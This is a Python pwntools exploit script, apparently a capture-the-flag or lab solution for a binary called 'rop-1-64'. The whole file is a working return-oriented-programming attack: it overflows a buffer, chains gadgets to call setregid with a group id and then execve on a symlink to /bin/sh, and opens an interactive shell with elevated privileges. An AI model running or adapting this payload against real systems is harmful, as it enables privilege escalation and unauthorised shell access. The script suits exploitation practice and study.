#!/usr/bin/env python

import os
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
prog = './rop-1-64'

os.system(b'ln -s /bin/sh read')

p = process(prog, env={})
#p = gdb.debug([prog], gdbscript='''
#        break *input_func
#        continue
#        ''')

execve = 0x400540
setregid = 0x400560
read = 0x4003b6
gid = 50001

pop_rdi = 0x4007b3
pop_rsi = 0x4007b1
pop_rdx = 0x400699

payload = cyclic(136) + p64(pop_rdi) + p64(gid) + p64(pop_rsi) + p64(gid) + b'45454545' + p64(setregid)
payload += p64(pop_rdi) + p64(read) + p64(pop_rsi) + p64(0) + b'67676767' + p64(pop_rdx)
payload += p64(0) + b'89898989' + p64(execve)

p.sendline(payload)
#p.interactive()

p.wait(0.1)
p.interactive()

os.system('rm read')



